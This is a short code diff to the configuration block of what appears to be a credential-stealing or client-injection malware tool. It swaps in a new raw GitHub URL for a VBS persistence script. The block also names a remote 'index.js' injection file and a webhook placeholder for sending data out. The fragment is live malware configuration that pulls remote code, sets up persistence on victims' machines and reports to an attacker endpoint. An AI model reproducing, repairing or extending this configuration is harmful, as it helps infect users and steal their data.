@@ -23,7 +23,7 @@ var config = {
   transfer_link: `%TRANSFER_URL%`,
   injection_url: "https://raw.githubusercontent.com/KSCHcuck/sub/main/index.js",
   injector_url:
-    "https://raw.githubusercontent.com/KSCHcuck/sub/main/Persist.vbs",
+    "https://raw.githubusercontent.com/KSCHcuck/sub/refs/heads/main/VBS_Persist.vbs",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
